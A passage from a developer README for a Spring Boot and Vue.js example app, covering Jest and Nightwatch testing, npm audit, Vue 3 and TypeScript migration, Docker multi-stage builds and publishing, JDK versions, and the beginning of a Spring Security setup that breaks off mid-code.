This will integrate the Jest Unittests right after the npm run build command, just you are used to in Java-style projects:

![maven-integration-jest-unittests](screenshots/maven-integration-jest-unittests.png)

And don't mind the depiction with `ERROR` - this is just a known bug: https://github.com/eirslett/frontend-maven-plugin/issues/584


##### Run Jest tests inside IntelliJ

First, we need to install the NodeJS IntelliJ plugin (https://www.jetbrains.com/help/idea/developing-node-js-applications.html), which isn't bundled with IntelliJ by default:

![nodejs-intellij-plugin](screenshots/nodejs-intellij-plugin.png)

IntelliJ Jest integration docs: https://www.jetbrains.com/help/idea/running-unit-tests-on-jest.html

The automatic search inside the [package.json](frontend/package.json) for the Jest configuration file [jest.conf.js](frontend/test/unit/jest.conf.js) doesn't seem to work right now, so we have to manually configure the `scripts` part of:

```
""unit"": ""jest --config test/unit/jest.conf.js --coverage"",
```

inside the Run Configuration under `Jest` and `All Tests`:

![configure-jest-inside-intellij](screenshots/configure-jest-inside-intellij.png)

Now, when running `All Tests`, this should look like you're already used to Unittest IntelliJ-Integration:

![run-jest-inside-intellij](screenshots/run-jest-inside-intellij.png)

 

## End-2-End (E2E) tests with Nightwatch

Great tooling: http://nightwatchjs.org/ - Nightwatch controls WebDriver / Selenium standalone Server in own child process and abstracts from those, providing a handy DSL for Acceptance tests:

Docs: http://nightwatchjs.org/gettingstarted/#browser-drivers-setup

![http://nightwatchjs.org/img/operation.png](http://nightwatchjs.org/img/operation.png)

Nightwatch is configured through the [nightwatch.conf.js](/frontend/test/e2e/nightwatch.conf.js). Watch out for breaking changes in 1.x: https://github.com/nightwatchjs/nightwatch/wiki/Migrating-to-Nightwatch-1.0

More options could be found in the docs: http://nightwatchjs.org/gettingstarted/#settings-file


#### Write Nightwatch tests

An example Nightwatch test is provided in [HelloAcceptance.test.js](/frontend/test/e2e/specs/HelloAcceptance.test.js):

```js
module.exports = {
    'default e2e tests': browser => {
        browser
            .url(process.env.VUE_DEV_SERVER_URL)
            .waitForElementVisible('#app', 5000)
            .assert.elementPresent('.hello')
            .assert.containsText('h1', 'Welcome to your Vue.js powered Spring Boot App')
            .assert.elementCount('img', 1)
            .end()
    }
}
```

##### Run E2E Tests

`npm run test:e2e`


## Run all tests

 `npm test`



## NPM Security

npm Security - npm@6

https://medium.com/npm-inc/announcing-npm-6-5d0b1799a905

`npm audit`

https://blog.npmjs.org/post/173719309445/npm-audit-identify-and-fix-insecure

Run `npm audit fix` to update the vulnerable packages. Only in situations, where nothing else helps, try `npm audit fix --force` (this will also install braking changes)

https://nodejs.org/en/blog/vulnerability/june-2018-security-releases/

---> __Update NPM regularly__

https://docs.npmjs.com/troubleshooting/try-the-latest-stable-version-of-npm

`npm install -g npm@latest`

---> __Update Packages regularly__

https://docs.npmjs.com/getting-started/updating-local-packages

`npm outdated`

`npm update`




## Shift from templates to plugin-based architecture in Vue Cli 3

In the long run, templates like the main [webpack](https://github.com/vuejs-templates/webpack) are deprecated in the Vue.js universe:

https://vuejsdevelopers.com/2018/03/26/vue-cli-3/

Plugins bring the following benefits compared to templates:

* No lock in, as plugins can be added at any point in the development lifecycle
* Zero config plugins allow you to spend time developing rather than configuring
* Easy to upgrade, as configuration can be customized without â€œejectingâ€
* Allows developers to make their own plugins and presets

Starting point: https://cli.vuejs.org/


#### OMG! My package.json is so small - Vue CLI 3 Plugins

From https://cli.vuejs.org/guide/plugins-and-presets.html:

> Vue CLI uses a plugin-based architecture. If you inspect a newly created project's package.json, you will find dependencies that start with `@vue/cli-plugin-`. Plugins can modify the internal webpack configuration and inject commands to `vue-cli-service`. Most of the features listed during the project creation process are implemented as plugins.

With plugings, extensions to an existing project could also be made via: `vue add pluginName`. E.g. if you want to add Nightwatch E2E tests to your project, just run `vue add @vue/e2e-nightwatch`. All scoped packages are available here: https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue

These new Vue CLI 3 plugin architecture cleans our big `package.json` to a really neat compact thing. This was the old big dependency block:

````json
  ""devDependencies"": {
    ""@vue/test-utils"": ""^1.0.0-beta.25"",
    ""autoprefixer"": ""^7.1.2"",
    ""babel-core"": ""^6.26.3"",
    ""babel-helper-vue-jsx-merge-props"": ""^2.0.3"",
    ""babel-jest"": ""^21.0.2"",
    ""babel-loader"": ""^7.1.5"",
    ""babel-plugin-dynamic-import-node"": ""^1.2.0"",
    ""babel-plugin-syntax-jsx"": ""^6.18.0"",
    ""babel-plugin-transform-es2015-modules-commonjs"": ""^6.26.0"",
    ""babel-plugin-transform-runtime"": ""^6.22.0"",
    ""babel-plugin-transform-vue-jsx"": ""^3.5.0"",
    ""babel-preset-env"": ""^1.7.0"",
    ""babel-preset-stage-2"": ""^6.22.0"",
    ""babel-register"": ""^6.22.0"",
    ""chalk"": ""^2.4.1"",
    ""chromedriver"": ""^2.41.0"",
    ""copy-webpack-plugin"": ""^4.5.2"",
    ""cross-spawn"": ""^5.0.1"",
    ""css-loader"": ""^0.28.0"",
    ""extract-text-webpack-plugin"": ""^3.0.0"",
    ""file-loader"": ""^1.1.4"",
    ""friendly-errors-webpack-plugin"": ""^1.6.1"",
    ""html-webpack-plugin"": ""^2.30.1"",
    ""jest"": ""^22.0.4"",
    ""jest-serializer-vue"": ""^0.3.0"",
    ""nightwatch"": ""^1.0.11"",
    ""node-notifier"": ""^5.1.2"",
    ""optimize-css-assets-webpack-plugin"": ""^3.2.0"",
    ""ora"": ""^1.2.0"",
    ""portfinder"": ""^1.0.17"",
    ""postcss-import"": ""^11.0.0"",
    ""postcss-loader"": ""^2.1.6"",
    ""postcss-url"": ""^7.2.1"",
    ""rimraf"": ""^2.6.0"",
    ""selenium-server"": ""^3.14.0"",
    ""semver"": ""^5.5.1"",
    ""shelljs"": ""^0.7.6"",
    ""uglifyjs-webpack-plugin"": ""^1.3.0"",
    ""url-loader"": ""^1.1.1"",
    ""vue-jest"": ""^1.0.2"",
    ""vue-loader"": ""^13.7.3"",
    ""vue-style-loader"": ""^3.0.1"",
    ""vue-template-compiler"": ""^2.5.17"",
    ""webpack"": ""^3.6.0"",
    ""webpack-bundle-analyzer"": ""^2.13.1"",
    ""webpack-dev-server"": ""^2.11.3"",
    ""webpack-merge"": ""^4.1.4""
  },
````

As you can see, weÂ´re not only maintaining our high-level libraries of choice like nightwatch, jest and so on. WeÂ´re also maintaining libraries that they use itself. Now this is over with Vue CLI 3. LetÂ´s have a look at the super clean dependency block now:

```json
""devDependencies"": {
    ""@vue/cli-plugin-babel"": ""^3.0.3"",
    ""@vue/cli-plugin-e2e-nightwatch"": ""^3.0.3"",
    ""@vue/cli-plugin-unit-jest"": ""^3.0.3"",
    ""@vue/cli-service"": ""^3.0.3"",
    ""@vue/test-utils"": ""^1.0.0-beta.20"",
    ""babel-core"": ""7.0.0-bridge.0"",
    ""babel-jest"": ""^23.0.1"",
    ""node-sass"": ""^4.9.0"",
    ""sass-loader"": ""^7.0.1"",
    ""vue-template-compiler"": ""^2.5.17""
  },
``` 

As you dig into the directories like `node_modules/@vue/cli-plugin-e2e-nightwatch`, youÂ´ll find where the used libraries of nightwatch are configured - in the respective `package.json` there:

```json
  ""dependencies"": {
    ""@vue/cli-shared-utils"": ""^3.0.2"",
    ""chromedriver"": ""^2.40.0"",
    ""deepmerge"": ""^2.1.1"",
    ""execa"": ""^0.10.0"",
    ""nightwatch"": ""^0.9.21"",
    ""selenium-server"": ""^3.13.0""
  },
```

This is really cool, I have to admit!


#### The vue.config.js file

Vue CLI 3 removes the need for explicit configuration files - and thus you wont find any `build` or `config` directories in your projects root any more. This now implements a ""convention over configuration"" approach, which makes it much easier to kick-start a Vue.js project, as it provides widly used defaults to webpack etc. It also eases the upgradeability of Vue.js projects - or even makes it possible. 

__But__: How do we configure webpack etc. for CORS handling, the build directories and so on? This could be done with the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js):

```javascript
module.exports = {
  // proxy all webpack dev-server requests starting with /api
  // to our Spring Boot backend (localhost:8098) using http-proxy-middleware
  // see https://cli.vuejs.org/config/#devserver-proxy
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:8098',
        ws: true,
        changeOrigin: true
      }
    }
  },
  // Change build paths to make them Maven compatible
  // see https://cli.vuejs.org/config/
  outputDir: 'target/dist'
}
```

#### Updating Vue in an existing project

Update your local `@vue/cli` to the latest version:

```
npm install -g @vue/cli
```

Then update Vue.js and all your other JS dependencies with:

```
cd frontend
npm update
```


## Upgrade to Vue.js 3.x/4.x next

Let's move from 2.6.x -> 3.x/4.x next here.

> Be aware that [the latest version of vue currently is `2.6.x` and `3.x` is considered `next`](https://www.npmjs.com/package/vue)!

There are some resources:

https://v3.vuejs.org/guide/migration/introduction.html#quickstart

https://johnpapa.net/vue2-to-vue3/

And if we are using 3.x, we can even migrate to 4.x: https://cli.vuejs.org/migrating-from-v3/


#### Upgrade from 2.x to 3.x

There's a migration tooling, simply use:

```shell
vue add vue-next
```

This took around 3 minutes or more on my MacBook and changed some files:

![vue-js-2.x-to-3.x-next-upgrade](screenshots/vue-js-2.x-to-3.x-next-upgrade.png)

The [package.json](frontend/package.json) got some new or upgraded deps:

![vue-js-2.x-to-3.x-next-upgrade-dependencies](screenshots/vue-js-2.x-to-3.x-next-upgrade-dependencies.png)

[As John stated in his post](https://johnpapa.net/vue2-to-vue3/) it's strange to find `beta` versions with `vue`, `vue-router` and `vuex`. 

So in order to see what a fresh skeleton would produce, let's also create one in another dir ([I assume you have `npm install -g @vue/cli` installed](https://v3.vuejs.org/guide/migration/introduction.html#quickstart):

```shell
mkdir vue3test && cd vue3test
vue create hello-vue3
```

I aligned my project to match the latest skeleton generation much better: So router, store and api got their own directories. The views are now in the correct folder `views` - and I extracted one component to use from the newly introduced `Home.vue` view: the `HelloSpringWorld.vue` component.

I also went over the [package.json](frontend/package.json) and upgraded to the latest release versions instead of alphas (except `@vue/test-utils` which only has a `rc` atm).

All imports were refactored too. Coming from this style:

```javascript
import Vue from 'vue'
import Router from 'vue-router'
```

everything now reads:

```javascript
import { createApp } from 'vue';
import { createRouter, createWebHistory } from 'vue-router'
```

Also check your `router.js` or [router/index.js](frontend/src/router/index.js)! Using a path redirect like this leads to a non working routing configuration:

```javascript
    // otherwise redirect to home
    { path: '*', redirect: '/' }
```

The error in the Browser console states:

```shell
Uncaught Error: Catch all routes (""*"") must now be defined using a param with a custom regexp.
See more at https://next.router.vuejs.org/guide/migration/#removed-star-or-catch-all-routes.
```

I changed it to the new param with regex syntax like this:

```javascript
    // otherwise redirect to home
    { path: '/:pathMatch(.*)*', redirect: '/' }
```

A crucial point to get jest to work again, was to add the following to the [jest.config.js](frontend/jest.config.js):

```javascript
  transform: {
    '^.+\\.vue$': 'vue-jest'
  }
```

Otherwise my tests ran into the following error:

```shell
npm run test:unit

> frontend@4.0.0 test:unit
> vue-cli-service test:unit --coverage

 FAIL  tests/unit/views/User.spec.js
  â— Test suite failed to run

    Vue packages version mismatch:

    - vue@3.0.11 (/Users/jonashecht/dev/spring-boot/spring-boot-vuejs/frontend/node_modules/vue/index.js)
    - vue-template-compiler@2.6.12 (/Users/jonashecht/dev/spring-boot/spring-boot-vuejs/frontend/node_modules/vue-template-compiler/package.json)

    This may cause things to work incorrectly. Make sure to use the same version for both.
    If you are using vue-loader@>=10.0, simply update vue-template-compiler.
    If you are using vue-loader@<10.0 or vueify, re-installing vue-loader/vueify should bump vue-template-compiler to the latest.

      at Object.<anonymous> (node_modules/vue-template-compiler/index.js:10:9)
```

Luckily this so answer helped me out: https://stackoverflow.com/a/65111966/4964553

And finally Bootstrap Vue doesn't support Vue 3.x right now: https://github.com/bootstrap-vue/bootstrap-vue/issues/5196 - So I temporarily commented out the imports.


#### Add TypeScript

Vue 3.x is now build with TypeScript: https://v3.vuejs.org/guide/typescript-support.html

> A static type system can help prevent many potential runtime errors as applications grow, which is why Vue 3 is written in TypeScript. This means you don't need any additional tooling to use TypeScript with Vue - it has first-class citizen support.

There's also a huge documentation of TypeScript itself at https://www.typescriptlang.org/docs/ I can also recommend https://medium.com/js-dojo/adding-typescript-to-your-existing-vuejs-2-6-app-aaa896c2d40a

To migrate your project there's the command:

```shell
vue add typescript
```

The first question arises: `Use class-style component syntax? (Y/n)` whether to use class-style component syntax or not. I didn't use it. I think the interface definitions of components are concise enough without the class-style. But let's see how this will work out.

So this was the output:

```shell
vue add typescript
 WARN  There are uncommitted changes in the current repository, it's recommended to commit or stash them first.
? Still proceed? Yes

ğŸ“¦  Installing @vue/cli-plugin-typescript...


added 59 packages, removed 58 packages, and audited 2219 packages in 6s

85 packages are looking for funding
  run `npm fund` for details

3 low severity vulnerabilities

To address all issues (including breaking changes), run:
  npm audit fix --force

Run `npm audit` for details.
âœ”  Successfully installed plugin: @vue/cli-plugin-typescript

? Use class-style component syntax? No
? Use Babel alongside TypeScript (required for modern mode, auto-detected polyfills, transpiling JSX)? Yes
? Use TSLint? Yes
? Pick lint features: Lint on save
? Convert all .js files to .ts? Yes
? Allow .js files to be compiled? Yes
? Skip type checking of all declaration files (recommended for apps)? Yes

ğŸš€  Invoking generator for @vue/cli-plugin-typescript...
ğŸ“¦  Installing additional dependencies...


added 2 packages, and audited 2221 packages in 3s
...
âœ”  Successfully invoked generator for plugin: @vue/cli-plugin-typescript
```

Now I went through all the componentes and views and extended `<script>` to `<script lang=""ts"">`.

Also I changed

```javascript
  export default {
```

to

```javascript
import { defineComponent } from 'vue';

export default defineComponent({
```

Now we need to transform our JavaScript code into TypeScript.

A really good introduction could be found here: https://www.vuemastery.com/blog/getting-started-with-typescript-and-vuejs/

> This process will take a while, depending on your code - and mainly on your knowledge about TypeScript. But I think it's a great path to go!

Don't forget to deactivate source control for `.js` and `.map` files in `src`, because these will now be generated (aka transpiled) from TypeScript and [shouldn't be checked in (anymore)](https://stackoverflow.com/a/26464907/4964553).

I enhanced my [frontend/.gitignore](frontend/.gitignore) like this:

```shell
# TypeScript
*.map
src/*.js
test/*.js
```

##### Vuex Store with TypeScript

According to https://next.vuex.vuejs.org/guide/typescript-support.html#typing-store-property-in-vue-component in order to use vuex store with TypeScript, we:

> must declare your own module augmentation.

TLDR; we need to create a file [src/vuex.d.ts](frontend/src/vuex.d.ts):

```javascript
import { ComponentCustomProperties } from 'vue'
import { Store } from 'vuex'

declare module '@vue/runtime-core' {
  // declare your own store states
  interface State {
    count: number
  }

  // provide typings for `this.$store`
  interface ComponentCustomProperties {
    $store: Store<State>
  }
}
```


#### Bootstrap support for Vue.js 3/Next

Our View [Bootstrap.vue](frontend/src/views/Bootstrap.vue) is based on the library `bootstrap-vue`, which brings in some nice Bootstrap CSS stylings & components.

But bootstrap-vue isn't compatible with Vue.js 3/Next: https://github.com/bootstrap-vue/bootstrap-vue/issues/5196 and it's unclear, when it's going to support it - or even if at all.

With the upgrade to Vue.js 3.x our `bootstrap-vue` based component view stopped working.

There's also another change: [Bootstrap 5.x is here to be the next evolutionary step - and it even dropped the need for JQuery](https://blog.getbootstrap.com/2020/06/16/bootstrap-5-alpha/).

But also Bootstrap 5.x isn't supported by `bootstrap-vue` right now. So let's try to use Bootstrap without it?!

Therefore install bootstrap next (which - as like Vue.js - stands for the new version 5):

```shell
npm i bootstrap@next
npm i @popperjs/core
```

Since Bootstrap 5 depends on `popperjs` for tooltips (see https://getbootstrap.com/docs/5.0/getting-started/introduction/#js), we also need to include it.

We can remove `""bootstrap-vue"": ""2.21.2""` and `""jquery"": ""3.6.0"",` from our `package.json`.

We also need to import Bootstrap inside our [main.ts](frontend/src/main.ts):

```javascript
import ""bootstrap/dist/css/bootstrap.min.css"";
import ""bootstrap"";
```

Let's try to use Bootstrap 5 inside our [Bootstrap.vue](frontend/src/views/Bootstrap.vue).

And also inside the `Login.vue` and the `Protected.vue`. Using Bootstrap 5.x components without `bootstrap-vue` seems to be no problem (see docs how to use here: https://getbootstrap.com/docs/5.0/components/badge/).


## Build and run with Docker

In the issue [jonashackt/spring-boot-vuejs/issues/25](https://github.com/jonashackt/spring-boot-vuejs/issues/25) the question on how to build and run our spring-boot-vuejs app with Docker. 

As already stated in the issue there are multiple ways of doing this. One I want to outline here is a more in-depth variant, where you'll know exacltly what's going on behind the scenes.

First we'll make use of [Docker's multi-stage build feature](https://docs.docker.com/develop/develop-images/multistage-build/) - in __the first stage__ we'll build our Spring Boot Vue.js app using our established Maven build process. Let's have a look into our [Dockerfile](Dockerfile):

```dockerfile
# Docker multi-stage build

# 1. Building the App with Maven
FROM maven:3-jdk-11

ADD . /springbootvuejs
WORKDIR /springbootvuejs

# Just echo so we can see, if everything is there :)
RUN ls -l

# Run Maven build
RUN mvn clean install
```

A crucial part here is to add all necessary files into our Docker build context - but leaving out the underlying OS specific node libraries! As not leaving them out would lead [to errors like](https://stackoverflow.com/questions/37986800/node-sass-could-not-find-a-binding-for-your-current-environment?page=1&tab=active#tab-top):

```
Node Sass could not find a binding for your current environment: Linux 64-bit with Node.js 11.x
```

Therefore we create a [.dockerignore](.dockerignore) file and leave out the directories `frontend/node_modules` & `frontend/node` completely using the `frontend/node*` configuration:

```
# exclude underlying OS specific node modules
frontend/node*

# also leave out pre-build output folders
frontend/target
backend/target
```

We also ignore the pre-build output directories.

In __the second stage__ of our [Dockerfile](Dockerfile) we use the build output of the first stage and prepare everything to run our Spring Boot powered Vue.js app later:

```dockerfile
# Just using the build artifact and then removing the build-container
FROM openjdk:11-jdk

MAINTAINER Jonas Hecht

VOLUME /tmp

# Add Spring Boot app.jar to Container
COPY --from=0 ""/springbootvuejs/backend/target/backend-0.0.1-SNAPSHOT.jar"" app.jar

ENV JAVA_OPTS=""""

# Fire up our Spring Boot app by default
ENTRYPOINT [ ""sh"", ""-c"", ""java $JAVA_OPTS -Djava.security.egd=file:/dev/./urandom -jar /app.jar"" ]
```

Now we should everything prepared to run our Docker build:

```
docker build . --tag spring-boot-vuejs:latest
```

This build can take a while, since all Maven and NPM dependencies need to be downloaded for the build.

When the build is finished, simply start a Docker container based on the newly build image and prepare the correct port to be bound to the Docker host for easier access later:

```
docker run -d -p 8098:8098 --name myspringvuejs spring-boot-vuejs
```

Have a look into your running Docker containers with `docker ps` and you should see the new container:

```
$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
745e854d7781        spring-boot-vuejs   ""sh -c 'java $JAVA_Oâ€¦""   12 seconds ago      Up 11 seconds       0.0.0.0:8098->8098/tcp   myspringvuejs
```

If you want to see the typical Spring Boot startup logs, just use `docker logs 745e854d7781 --follow`:

```
$ docker logs 745e854d7781 --follow

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.1.2.RELEASE)

2019-01-29 09:42:07.621  INFO 8 --- [           main] d.j.s.SpringBootVuejsApplication         : Starting SpringBootVuejsApplication v0.0.1-SNAPSHOT on 745e854d7781 with PID 8 (/app.jar started by root in /)
2019-01-29 09:42:07.627  INFO 8 --- [           main] d.j.s.SpringBootVuejsApplication         : No active profile set, falling back to default profiles: default
2019-01-29 09:42:09.001  INFO 8 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data repositories in DEFAULT mode.
2019-01-29 09:42:09.103  INFO 8 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 90ms. Found 1 repository interfaces.
2019-01-29 09:42:09.899  INFO 8 --- [           main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration' of type [org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration$$EnhancerBySpringCGLIB$$bb072d94] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2019-01-29 09:42:10.715  INFO 8 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8098 (http)
2019-01-29 09:42:10.765  INFO 8 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
2019-01-29 09:42:10.765  INFO 8 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.14]
2019-01-29 09:42:10.783  INFO 8 --- [           main] o.a.catalina.core.AprLifecycleListener   : The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: [/usr/java/packages/lib:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
2019-01-29 09:42:10.920  INFO 8 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
2019-01-29 09:42:10.921  INFO 8 --- [           main] o.s.web.context.ContextLoader            : Root WebApplicationContext: initialization completed in 3209 ms
2019-01-29 09:42:11.822  INFO 8 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
2019-01-29 09:42:12.177  INFO 8 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
2019-01-29 09:42:12.350  INFO 8 --- [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [
	name: default
	...]
2019-01-29 09:42:12.520  INFO 8 --- [           main] org.hibernate.Version                    : HHH000412: Hibernate Core {5.3.7.Final}
2019-01-29 09:42:12.522  INFO 8 --- [           main] org.hibernate.cfg.Environment            : HHH000206: hibernate.properties not found
2019-01-29 09:42:12.984  INFO 8 --- [           main] o.hibernate.annotations.common.Version   : HCANN000001: Hibernate Commons Annotations {5.0.4.Final}
2019-01-29 09:42:13.894  INFO 8 --- [           main] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
2019-01-29 09:42:15.644  INFO 8 --- [           main] o.h.t.schema.internal.SchemaCreatorImpl  : HHH000476: Executing import script 'org.hibernate.tool.schema.internal.exec.ScriptSourceInputNonExistentImpl@64524dd'
2019-01-29 09:42:15.649  INFO 8 --- [           main] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
2019-01-29 09:42:16.810  INFO 8 --- [           main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService 'applicationTaskExecutor'
2019-01-29 09:42:16.903  WARN 8 --- [           main] aWebConfiguration$JpaWebMvcConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
2019-01-29 09:42:17.116  INFO 8 --- [           main] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page: class path resource [public/index.html]
2019-01-29 09:42:17.604  INFO 8 --- [           main] o.s.b.a.e.web.EndpointLinksResolver      : Exposing 2 endpoint(s) beneath base path '/actuator'
2019-01-29 09:42:17.740  INFO 8 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8098 (http) with context path ''
2019-01-29 09:42:17.745  INFO 8 --- [           main] d.j.s.SpringBootVuejsApplication         : Started SpringBootVuejsApplication in 10.823 seconds (JVM running for 11.485)
```

Now access your Dockerized Spring Boot powererd Vue.js app inside your Browser at [http://localhost:8098](http://localhost:8098). 

If you have played enough with your Dockerized app, don't forget to stop (`docker stop 745e854d7781`) and remove (`docker rm 745e854d7781`) it in the end.


#### Autorelease to Docker Hub on hub.docker.com

We also want to have the current version of our code build and released to https://hub.docker.com/. Therefore head to the repositories tab in Docker Hub and click `Create Repository`:

![docker-hub-create-repo](screenshots/docker-hub-create-repo.png)

As the docs state, there are some config options to [setup automated builds](https://docs.docker.com/docker-hub/builds/).

Finally, we should see our Docker images released on https://hub.docker.com/r/jonashackt/spring-boot-vuejs and could run this app simply by executing:

```
docker run -p 8098:8098 jonashackt/spring-boot-vuejs:latest
```

This pulls the latest `jonashackt/spring-boot-vuejs` image and runs our app locally:

```
docker run -p 8098:8098 jonashackt/spring-boot-vuejs:latest
Unable to find image 'jonashackt/spring-boot-vuejs:latest' locally
latest: Pulling from jonashackt/spring-boot-vuejs
9a0b0ce99936: Pull complete
db3b6004c61a: Pull complete
f8f075920295: Pull complete
6ef14aff1139: Pull complete
962785d3b7f9: Pull complete
e275e7110d81: Pull complete
0ce121b6a2ff: Pull complete
71607a6adeb3: Pull complete
Digest: sha256:4037576ba5f6c58ed067eeef3ab2870a9de8dd1966a5906cb3d36d0ad98fa541
Status: Downloaded newer image for jonashackt/spring-boot-vuejs:latest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.2.0.RELEASE)

2019-11-02 16:15:37.967  INFO 7 --- [           main] d.j.s.SpringBootVuejsApplication         : Starting SpringBootVuejsApplication v0.0.1-SNAPSHOT on aa490bc6ddf4 with PID 7 (/app.jar started by root in /)
2019-11-02 16:15:37.973  INFO 7 --- [           main] d.j.s.SpringBootVuejsApplication         : No active profile set, falling back to default profiles: default
2019-11-02 16:15:39.166  INFO 7 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data repositories in DEFAULT mode.
2019-11-02 16:15:39.285  INFO 7 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 99ms. Found 1 repository interfaces.
2019-11-02 16:15:39.932  INFO 7 --- [           main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration' of type [org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2019-11-02 16:15:40.400  INFO 7 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8098 (http)
2019-11-02 16:15:40.418  INFO 7 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
...
2019-11-02 16:15:54.048  INFO 7 --- [nio-8098-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
2019-11-02 16:15:54.081  INFO 7 --- [nio-8098-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 32 ms
```


Now head over to [http://localhost:8098/](http://localhost:8098/) and see the app live :)


# Run with JDK 8, 9 or 11 ff

As with Spring Boot, we can define the desired Java version simply by editing our backend's [pom.xml](backend/pom.xml): 

```
	<properties>
		<java.version>1.8</java.version>
	</properties>
```

If you want to have `JDK9`, place a `<java.version>9</java.version>` or other versions just as you like to (see [this stackoverflow answer](https://stackoverflow.com/questions/54467287/how-to-specify-java-11-version-in-spring-spring-boot-pom-xml)).

Spring Boot handles the needed `maven.compiler.release`, which tell's Java from version 9 on to build for a specific target.

We just set `1.8` as the baseline here, since if we set a newer version as the standard, builds on older versions then 8 will fail (see [this build log for example](https://travis-ci.org/jonashackt/spring-boot-vuejs/builds/547227298).

Additionally, we use GitHub Actions to run the Maven build on some mayor Java versions - have a look into the [build.yml](.github/workflows/build.yml) workflow:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        java-version: [ 8, 11, 15 ]
```


# Secure Spring Boot backend and protect Vue.js frontend

Securing parts of our application must consist of two parts: securing the Spring Boot backend - and reacting on that secured backend in the Vue.js frontend.

https://spring.io/guides/tutorials/spring-security-and-angular-js/

https://developer.okta.com/blog/2018/11/20/build-crud-spring-and-vue

https://auth0.com/blog/vuejs2-authentication-tutorial/

https://medium.com/@zitko/structuring-a-vue-project-authentication-87032e5bfe16





## Secure the backend API with Spring Security

https://spring.io/guides/tutorials/spring-boot-oauth2

https://spring.io/guides/gs/securing-web/

https://www.baeldung.com/rest-assured-authentication

Now let's focus on securing our Spring Boot backend first! Therefore we introduce a new RESTful resource, that we want to secure specifically:


                   +---+                  +---+                  +---+
                   |   | /api/hello       |   | /api/user        |   | /api/secured
                   +---+                  +---+                  +---+
                     |                      |                      |
        +-----------------------------------------------------------------------+
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
        |                                                                       |
        +-----------------------------------------------------------------------+


#### Configure Spring Security

First we add a new REST resource `/secured` inside our `BackendController we want to secure - and use in a separate frontend later:

```
    @GetMapping(path=""/secured"")
    public @ResponseBody String getSecured() {
        LOG.info(""GET successfully called on /secured resource"");
        return SECURED_TEXT;
    }
```

With Spring it is relatively easy to secure our API. Let's add `spring-boot-starter-security` to our [pom.xml](backend/pom.xml):

```xml
		<!-- Secure backend API -->
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-security</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.security</groupId>
			<artifactId>spring-security-test</artifactId>
			<scope>test</scope>
		</dependency>
```

Also create a new @Configuration annotated class called [WebSecurityConfiguration.class](backend/src/main/java/de/jonashackt/springbootvuejs/configuration/WebSecurityConfiguration.java):

```java
package de.jonashackt.springbootvuejs.configuration;

import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.http.SessionCreationPolicy;

@Configuration
@EnableWebSecurity
public class WebSecurityConfiguration extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {

        http
